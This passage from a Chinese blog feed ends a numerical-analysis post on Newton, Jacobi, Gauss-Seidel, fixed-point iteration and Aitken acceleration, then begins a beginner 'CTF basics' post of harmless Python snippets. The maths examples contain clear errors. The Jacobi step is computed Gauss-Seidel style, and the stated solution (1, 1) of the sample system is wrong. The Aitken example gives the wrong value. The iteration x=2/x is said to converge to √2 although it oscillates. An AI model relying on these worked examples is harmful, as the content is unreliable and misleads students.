0.71$，$f’(2.17) &#x3D; 4.34$，迭代得：<br>$$<br>x_2 &#x3D; 2.17 - \frac{0.71}{4.34} \approx 2.01<br>$$</li><li>逐步逼近根 $x &#x3D; 2$。</li></ul><h2 id="3-解线性方程组的迭代方法"><a href="#3-解线性方程组的迭代方法" class="headerlink" title="3. 解线性方程组的迭代方法"></a>3. 解线性方程组的迭代方法</h2><p>线性方程组的迭代法适用于大规模稀疏矩阵的求解。常见的迭代方法有雅可比迭代法和高斯-赛德尔迭代法。</p><h3 id="3-1-雅可比迭代法"><a href="#3-1-雅可比迭代法" class="headerlink" title="3.1 雅可比迭代法"></a>3.1 雅可比迭代法</h3><p>雅可比迭代法的基本思想是将每个变量逐次更新，基于旧的解进行新的迭代。方程组 $Ax &#x3D; b$ 被拆分为形式：<br>$$<br>x_i^{(k+1)} &#x3D; \frac{1}{a_{ii}} \left(b_i - \sum_{j \neq i} a_{ij} x_j^{(k)} \right)<br>$$</p><p><strong>举例</strong>：解线性方程组<br>$$<br>\begin{aligned}<br>2x_1 + x_2 &amp;&#x3D; 5 \<br>x_1 + 3x_2 &amp;&#x3D; 6<br>\end{aligned}<br>$$</p><ul><li>初始猜测 $x_1^{(0)} &#x3D; x_2^{(0)} &#x3D; 0$。</li><li>第一次迭代：<br>$$<br>x_1^{(1)} &#x3D; \frac{1}{2} (5 - 0) &#x3D; 2.5<br>$$<br>$$<br>x_2^{(1)} &#x3D; \frac{1}{3} (6 - 0) &#x3D; 2<br>$$</li><li>第二次迭代：<br>$$<br>x_1^{(2)} &#x3D; \frac{1}{2} (5 - 2) &#x3D; 1.5<br>$$<br>$$<br>x_2^{(2)} &#x3D; \frac{1}{3} (6 - 1.5) &#x3D; 1.5<br>$$<br>迭代继续进行，逐步逼近解 $x_1 &#x3D; 1$，$x_2 &#x3D; 1$。</li></ul><h3 id="3-2-高斯-赛德尔迭代法"><a href="#3-2-高斯-赛德尔迭代法" class="headerlink" title="3.2 高斯-赛德尔迭代法"></a>3.2 高斯-赛德尔迭代法</h3><p>高斯-赛德尔法是雅可比法的改进，每次迭代时，使用最新的解来更新当前变量。与雅可比法相比，收敛速度更快。</p><p><strong>举例</strong>：使用高斯-赛德尔法解上面的方程组。</p><ul><li>初始猜测 $x_1^{(0)} &#x3D; x_2^{(0)} &#x3D; 0$。</li><li>第一次迭代：<br>$$<br>x_1^{(1)} &#x3D; \frac{1}{2} (5 - 0) &#x3D; 2.5<br>$$<br>使用最新的 $x_1^{(1)} &#x3D; 2.5$ 来更新 $x_2$：<br>$$<br>x_2^{(1)} &#x3D; \frac{1}{3} (6 - 2.5) &#x3D; 1.167<br>$$</li><li>第二次迭代：<br>$$<br>x_1^{(2)} &#x3D; \frac{1}{2} (5 - 1.167) &#x3D; 1.917<br>$$<br>$$<br>x_2^{(2)} &#x3D; \frac{1}{3} (6 - 1.917) &#x3D; 1.361<br>$$<br>继续迭代，逐步逼近解。</li></ul><h2 id="4-不动点迭代法"><a href="#4-不动点迭代法" class="headerlink" title="4. 不动点迭代法"></a>4. 不动点迭代法</h2><p>不动点迭代法是一种通过 $x &#x3D; g(x)$ 的迭代形式求解方程的方法，收敛性依赖于 $g(x)$ 的性质。</p><h3 id="4-1-算法步骤"><a href="#4-1-算法步骤" class="headerlink" title="4.1 算法步骤"></a>4.1 算法步骤</h3><ol><li>从一个初始猜测值 $x_0$ 开始。</li><li>根据公式 $x_{n+1} &#x3D; g(x_n)$ 计算新值。</li><li>重复第 2 步，直到收敛到一个解。</li></ol><h3 id="4-2-收敛性条件"><a href="#4-2-收敛性条件" class="headerlink" title="4.2 收敛性条件"></a>4.2 收敛性条件</h3><p>不动点迭代法的收敛性依赖于函数 $g(x)$ 的性质，尤其是它在不动点附近的导数。如果 $g(x)$ 在不动点附近满足以下条件，则该方法收敛：</p><ul><li>存在 $c \in (0, 1)$，使得 $|g’(x)| \leq c$，那么迭代将收敛。</li></ul><p><strong>举例</strong>：<br>求解方程 $x^2 - 2 &#x3D; 0$ 的根，可以转化为不动点形式 $x &#x3D; \frac{2}{x}$。设初始值 $x_0 &#x3D; 1$，通过迭代公式：<br>$$<br>x_{n+1} &#x3D; \frac{2}{x_n}<br>$$<br>我们可以逐步逼近根 $x &#x3D; \sqrt{2}$。</p><h2 id="5-全局收敛性"><a href="#5-全局收敛性" class="headerlink" title="5. 全局收敛性"></a>5. 全局收敛性</h2><p>全局收敛性是指某种数值方法对任意初始点都能收敛到方程的解，而不仅仅是某个特定区间或条件下。</p><ul><li><strong>局部收敛性</strong>：如果算法只在某个初始点或特定区域内收敛到解，我们称其为局部收敛。</li><li><strong>全局收敛性</strong>：算法不依赖于初始猜测值，在较大的区间或空间内都能收敛到解。</li></ul><p><strong>举例</strong>：<br>二分法具有全局收敛性，因为只要函数在初始区间 $[a, b]$ 上连续并且满足 $f(a) \cdot f(b) &lt; 0$，无论初始猜测值如何，二分法都能收敛到根。而牛顿法通常是局部收敛的，它对初始值较为敏感。</p><h2 id="6-迭代收敛的加速方法"><a href="#6-迭代收敛的加速方法" class="headerlink" title="6. 迭代收敛的加速方法"></a>6. 迭代收敛的加速方法</h2><p>迭代方法在很多情况下会收敛较慢，因此引入一些加速技术来提高收敛速度是必要的。以下是几种常用的加速方法：</p><h3 id="6-1-Aitken加速法"><a href="#6-1-Aitken加速法" class="headerlink" title="6.1 Aitken加速法"></a>6.1 Aitken加速法</h3><p>Aitken加速法是一种常用的迭代加速技术，特别适用于线性收敛的迭代方法。其目的是通过消除逐次迭代产生的误差来加速收敛。</p><ul><li><strong>加速公式</strong>：给定迭代序列 ${x_n}$，Aitken加速后的序列 ${x_n^{\ast}}$ 的计算公式为：<br>$$<br>x_n^{\ast} &#x3D; x_n - \frac{(x_{n+1} - x_n)^2}{x_{n+2} - 2x_{n+1} + x_n}<br>$$</li><li>通过加速，迭代序列会收敛得更快。</li></ul><p><strong>举例</strong>：<br>假设我们有一组迭代值 $x_0 &#x3D; 1$，$x_1 &#x3D; 1.5$，$x_2 &#x3D; 1.75$，我们可以应用Aitken加速法计算新的值 $x_0^{\ast}$：<br>$$<br>x_0^{\ast} &#x3D; 1 - \frac{(1.5 - 1)^2}{1.75 - 2 \times 1.5 + 1} &#x3D; 1.3333<br>$$<br>加速后，新序列更快接近真实值。</p><h2 id="7-向量范数与向量序列的极限"><a href="#7-向量范数与向量序列的极限" class="headerlink" title="7. 向量范数与向量序列的极限"></a>7. 向量范数与向量序列的极限</h2><p>向量范数是用来衡量向量大小的工具，尤其是在处理迭代算法的收敛性分析时，向量范数有助于分析误差。</p><h3 id="7-1-常用的向量范数"><a href="#7-1-常用的向量范数" class="headerlink" title="7.1 常用的向量范数"></a>7.1 常用的向量范数</h3><ul><li><strong>1-范数</strong>：向量 $x &#x3D; (x_1, x_2, \dots, x_n)$ 的1-范数定义为：<br>$$<br>|x|_1 &#x3D; |x_1| + |x_2| + \dots + |x_n|<br>$$</li><li><strong>2-范数（欧几里得范数）</strong>：向量的2-范数定义为：<br>$$<br>|x|_2 &#x3D; \sqrt{x_1^2 + x_2^2 + \dots + x_n^2}<br>$$</li><li><strong>无穷范数</strong>：向量的无穷范数定义为：<br>$$<br>|x|_{\infty} &#x3D; \max(|x_1|, |x_2|, \dots, |x_n|)<br>$$</li></ul><h3 id="7-2-向量序列的极限"><a href="#7-2-向量序列的极限" class="headerlink" title="7.2 向量序列的极限"></a>7.2 向量序列的极限</h3><p>设有一个向量序列 ${x_k}$，如果当 $k \to \infty$ 时，向量序列逐渐接近某个向量 $x$，我们称 ${x_k}$ 收敛于 $x$。即：<br>$$<br>\lim_{k \to \infty} x_k &#x3D; x<br>$$<br>利用向量范数可以衡量序列的收敛性。</p><h2 id="8-迭代过程的收敛性"><a href="#8-迭代过程的收敛性" class="headerlink" title="8. 迭代过程的收敛性"></a>8. 迭代过程的收敛性</h2><p>迭代算法的收敛性指的是，随着迭代次数的增加，近似解是否逐步逼近真实解。</p><h3 id="8-1-线性收敛与超线性收敛"><a href="#8-1-线性收敛与超线性收敛" class="headerlink" title="8.1 线性收敛与超线性收敛"></a>8.1 线性收敛与超线性收敛</h3><ul><li><p><strong>线性收敛</strong>：如果存在一个常数 $0 &lt; r &lt; 1$，使得误差 $e_n$ 满足 $e_{n+1} \approx r e_n$，那么算法是线性收敛的。比如，二分法具有线性收敛性。</p></li><li><p><strong>超线性收敛</strong>：如果误差 $e_{n+1}$ 满足 $e_{n+1} \ll e_n$，即收敛速度快于线性，那么我们称之为超线性收敛。牛顿法在接近根时具有二次收敛（即误差平方减小）。</p></li></ul><h3 id="8-2-判定收敛性的方法"><a href="#8-2-判定收敛性的方法" class="headerlink" title="8.2 判定收敛性的方法"></a>8.2 判定收敛性的方法</h3><p>为了判断一个迭代过程是否收敛，我们可以计算当前迭代结果与前几次迭代结果的差异。如果差异逐步减小到一个很小的阈值，那么可以认为迭代过程收敛。</p><h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><ul><li><strong>不动点迭代法</strong>：是一种通过 $x &#x3D; g(x)$ 的迭代形式求解方程的方法，收敛性依赖于 $g(x)$ 的性质。</li><li><strong>全局收敛性</strong>：某种算法对所有初始点收敛的特性。</li><li><strong>加速方法</strong>：如 <strong>Aitken加速法</strong>，用于加快线性收敛迭代的速度。</li><li><strong>向量范数与向量序列的极限</strong>：范数用于衡量向量的大小，极限用于描述迭代序列的收敛性。</li><li><strong>迭代过程的收敛性</strong>：评估迭代算法的效果，关键是确定算法是否线性或超线性收敛。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf基础笔记</title>
    <link href="/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>CTF</strong> <strong>成员基础语法笔记</strong></p><p><strong>目录</strong></p><ol><li><strong>Python</strong> <strong>基础</strong></li><li><strong>JavaScript</strong> <strong>基础</strong></li><li><strong>PHP</strong> <strong>框架 - ThinkPHP</strong></li><li></li></ol><h1 id="1-Python-基础"><a href="#1-Python-基础" class="headerlink" title="1. Python 基础"></a><strong>1. Python</strong> <strong>基础</strong></h1><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li><p><a href="#1-python%E5%9F%BA%E7%A1%80">1. Python基础</a></p><ul><li><a href="#11-python%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">1.1 Python基本语法</a></li><li><a href="#12-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.2 数据类型</a></li><li><a href="#13-%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%AC%A6">1.3 常见操作符</a></li><li><a href="#14-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">1.4 条件语句</a></li><li><a href="#15-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84">1.5 循环结构</a></li><li><a href="#16-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%AD%97%E5%85%B8">1.6 列表与字典</a></li></ul></li><li><p><a href="#2-%E5%87%BD%E6%95%B0%E4%B8%8E%E6%A8%A1%E5%9D%97">2. 函数与模块</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89%E4%B8%8E%E8%B0%83%E7%94%A8">2.1 函数定义与调用</a></li><li><a href="#22-%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5">2.2 模块导入</a></li></ul></li><li><p><a href="#3-%E8%BF%9B%E9%98%B6%E5%86%85%E5%AE%B9">3. 进阶内容</a></p><ul><li><a href="#31-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">3.1 文件读写</a></li><li><a href="#32-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">3.2 异常处理</a></li><li><a href="#33-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8Fregex">3.3 正则表达式（Regex）</a></li><li><a href="#34-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86">3.4 加密与解密</a></li></ul></li><li><p><a href="#4-%E9%AB%98%E7%BA%A7%E5%86%85%E5%AE%B9">4. 高级内容</a></p><ul><li><a href="#41-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B">4.1 多线程与多进程</a></li><li><a href="#42-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%88%AC%E8%99%AB">4.2 网络与爬虫</a></li><li><a href="#43-%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99">4.3 利用Python进行自动化脚本编写</a></li></ul></li><li><p><a href="#5-ctf%E4%B8%AD%E7%9A%84python%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">5. CTF中的Python应用场景</a></p><ul><li><a href="#51-exploit%E5%BC%80%E5%8F%91">5.1 Exploit开发</a></li><li><a href="#52-%E9%80%86%E5%90%91%E4%B8%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90">5.2 逆向与二进制分析</a></li><li><a href="#53-%E5%A4%8D%E6%9D%82%E7%9A%84%E7%AE%97%E6%B3%95%E9%A2%98">5.3 复杂的算法题</a></li></ul></li></ul><h4 id="1-1-Python基本语法"><a href="#1-1-Python基本语法" class="headerlink" title="1.1 Python基本语法"></a>1.1 Python基本语法</h4><p><strong>Hello World</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br></code></pre></td></tr></table></figure><p>这是Python的入门示例，了解Python如何输出信息。</p><h4 id="1-2-数据类型"><a href="#1-2-数据类型" class="headerlink" title="1.2 数据类型"></a>1.2 数据类型</h4><p>Python中的基本数据类型包括：</p><ul><li><strong>整数（int）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure></li><li><strong>浮点数（float）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure></li><li><strong>字符串（str）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&quot;Python&quot;</span><br></code></pre></td></tr></table></figure></li><li><strong>布尔值（bool）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-3-常见操作符"><a href="#1-3-常见操作符" class="headerlink" title="1.3 常见操作符"></a>1.3 常见操作符</h4><ul><li>算术操作：<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>//</code>（整除），<code>%</code>（取模）</li><li>比较操作：<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li><li>逻辑操作：<code>and</code>, <code>or</code>, <code>not</code></li></ul><h4 id="1-4-条件语句"><a href="#1-4-条件语句" class="headerlink" title="1.4 条件语句"></a>1.4 条件语句</h4><p>CTF中的许多逻辑都依赖于条件判断，了解<code>if-else</code>语句是必要的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 大于 5&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 小于或等于 5&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="1-5-循环结构"><a href="#1-5-循环结构" class="headerlink" title="1.5 循环结构"></a>1.5 循环结构</h4><p>Python有两种常用的循环：<code>for</code>循环和<code>while</code>循环。</p><p><strong>for 循环</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p><strong>while 循环</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> x &lt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(x)<br>    x += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="1-6-列表与字典"><a href="#1-6-列表与字典" class="headerlink" title="1.6 列表与字典"></a>1.6 列表与字典</h4><ul><li><p><strong>列表（List）</strong>：存储多个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure></li><li><p><strong>字典（Dictionary）</strong>：键值对存储结构。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-函数与模块"><a href="#2-函数与模块" class="headerlink" title="2. 函数与模块"></a>2. 函数与模块</h3><h4 id="2-1-函数定义与调用"><a href="#2-1-函数定义与调用" class="headerlink" title="2.1 函数定义与调用"></a>2.1 函数定义与调用</h4><p>函数在CTF中是组织代码、复用功能的重要工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span><br><br><span class="hljs-built_in">print</span>(greet(<span class="hljs-string">&quot;CTF 选手&quot;</span>))<br></code></pre></td></tr></table></figure><h4 id="2-2-模块导入"><a href="#2-2-模块导入" class="headerlink" title="2.2 模块导入"></a>2.2 模块导入</h4><p>CTF中常用Python标准库和第三方模块进行信息处理。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib  <span class="hljs-comment"># 用于哈希函数</span><br><br><span class="hljs-comment"># 生成字符串的MD5值</span><br>hash_object = hashlib.md5(<span class="hljs-string">b&#x27;CTF&#x27;</span>).hexdigest()<br><span class="hljs-built_in">print</span>(hash_object)<br></code></pre></td></tr></table></figure><p>CTF常用的模块包括<code>hashlib</code>（处理哈希算法）、<code>requests</code>（网络请求）、<code>re</code>（正则表达式）等。</p><h3 id="3-进阶内容"><a href="#3-进阶内容" class="headerlink" title="3. 进阶内容"></a>3. 进阶内容</h3><h4 id="3-1-文件读写"><a href="#3-1-文件读写" class="headerlink" title="3.1 文件读写"></a>3.1 文件读写</h4><p>在CTF比赛中，很多情况下需要对文件进行读写操作，通常用于读取输入数据或写入解题结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;这是结果输出&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-2-异常处理"><a href="#3-2-异常处理" class="headerlink" title="3.2 异常处理"></a>3.2 异常处理</h4><p>CTF中的代码有时会出现意外错误，异常处理可以确保程序在错误情况下也能稳定运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span><br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能除以0！&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-3-正则表达式（Regex）"><a href="#3-3-正则表达式（Regex）" class="headerlink" title="3.3 正则表达式（Regex）"></a>3.3 正则表达式（Regex）</h4><p>正则表达式常用于CTF中的信息提取，尤其是文本分析和数据过滤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>text = <span class="hljs-string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span><br>pattern = <span class="hljs-string">r&#x27;flag&#123;.*&#125;&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, text)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找到了flag:&quot;</span>, <span class="hljs-keyword">match</span>.group())<br></code></pre></td></tr></table></figure><h4 id="3-4-加密与解密"><a href="#3-4-加密与解密" class="headerlink" title="3.4 加密与解密"></a>3.4 加密与解密</h4><p>在CTF中，加密与解密任务非常常见。使用Python处理常见的加密&#x2F;解密任务是一项必备技能。</p><p><strong>Base64解码</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">b&#x27;UHl0aG9u&#x27;</span><br>decoded = base64.b64decode(encoded)<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p><strong>哈希计算</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>data = <span class="hljs-string">b&quot;password123&quot;</span><br>hash_md5 = hashlib.md5(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MD5:&quot;</span>, hash_md5)<br><br>hash_sha256 = hashlib.sha256(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SHA256:&quot;</span>, hash_sha256)<br></code></pre></td></tr></table></figure><h3 id="4-高级内容"><a href="#4-高级内容" class="headerlink" title="4. 高级内容"></a>4. 高级内容</h3><h4 id="4-1-多线程与多进程"><a href="#4-1-多线程与多进程" class="headerlink" title="4.1 多线程与多进程"></a>4.1 多线程与多进程</h4><p>当需要处理大量数据或并发任务时，多线程和多进程能显著提高效率。</p><p><strong>多线程</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span> is running&quot;</span>)<br><br>thread1 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;A&quot;</span>,))<br>thread2 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;B&quot;</span>,))<br>thread1.start()<br>thread2.start()<br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure><h4 id="4-2-网络与爬虫"><a href="#4-2-网络与爬虫" class="headerlink" title="4.2 网络与爬虫"></a>4.2 网络与爬虫</h4><p>CTF中的一些题目涉及网络爬虫，使用Python可以快速获取并分析网页内容。</p><p><strong>请求网页</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>response = requests.get(<span class="hljs-string">&#x27;http://example.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p><strong>解析HTML</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.title.text)<br></code></pre></td></tr></table></figure><h4 id="4-3-利用Python进行自动化脚本编写"><a href="#4-3-利用Python进行自动化脚本编写" class="headerlink" title="4.3 利用Python进行自动化脚本编写"></a>4.3 利用Python进行自动化脚本编写</h4><p>自动化是CTF比赛中的重要技能，Python强大的自动化能力可以帮助快速解决某些复杂题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动化发送请求</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://example.com/login&quot;</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;<br>response = requests.post(url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="5-CTF中的Python应用场景"><a href="#5-CTF中的Python应用场景" class="headerlink" title="5. CTF中的Python应用场景"></a>5. CTF中的Python应用场景</h3><h4 id="5-1-Exploit开发"><a href="#5-1-Exploit开发" class="headerlink" title="5.1 Exploit开发"></a>5.1 Exploit开发</h4><p>在一些CTF的pwn题目中，选手需要编写Python脚本与远程服务进行交互，以利用漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>conn = remote(<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-number">12345</span>)<br><br><span class="hljs-comment"># 发送数据</span><br>conn.sendline(<span class="hljs-string">b&#x27;payload&#x27;</span>)<br><br><span class="hljs-comment"># 接收响应</span><br>response = conn.recvline()<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><h4 id="5-2-逆向与二进制分析"><a href="#5-2-逆向与二进制分析" class="headerlink" title="5.2 逆向与二进制分析"></a>5.2 逆向与二进制分析</h4><p>Python可以通过编写脚本来自动化逆向工程任务，解码加密数据或分析程序的输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对二进制数据进行解码</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;binaryfile&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    